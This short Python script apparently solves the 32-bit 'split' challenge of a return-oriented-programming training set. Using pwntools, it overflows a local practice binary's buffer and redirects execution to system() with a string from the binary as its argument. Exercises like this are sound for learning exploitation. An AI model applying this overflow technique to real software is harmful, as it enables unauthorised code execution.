from pwn import *

p = process('./split32')

useful_string = 0x804a030
system = 0x8048430

payload = 'a' * 44
payload += p32(system)
payload += 'aaaa'
payload += p32(useful_string)

p.sendline(payload)
print p.recvall()
